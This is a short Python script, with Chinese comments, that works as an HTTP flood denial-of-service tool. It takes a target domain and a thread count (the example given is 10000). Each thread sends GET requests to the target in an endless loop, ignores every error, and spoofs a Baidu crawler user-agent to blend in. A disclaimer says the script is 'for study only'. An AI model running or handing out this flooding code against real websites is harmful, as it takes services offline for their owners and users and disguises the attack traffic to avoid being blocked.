import threading,requests,sys

# 本工具只做学习交流使用，请遵守法律法规，严禁使用本工具进行非法破坏
# 第1个参数为攻击的域名,第2个参数为自定义线程数。eg:xxx.com  10000
def dos(url):
    url2='http://'+url
    while True:
        try:
            response=requests.get(url2,headers={'user-agent':'Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)'})
            # print('状态码:',response.status_code)
        except Exception as e:
            pass

if __name__ == '__main__':
    url=sys.argv[1]
    th_nums=sys.argv[2]
    for th_num in range(int(th_nums)):
        t=threading.Thread(target=dos,args=(url,))
        t.start()
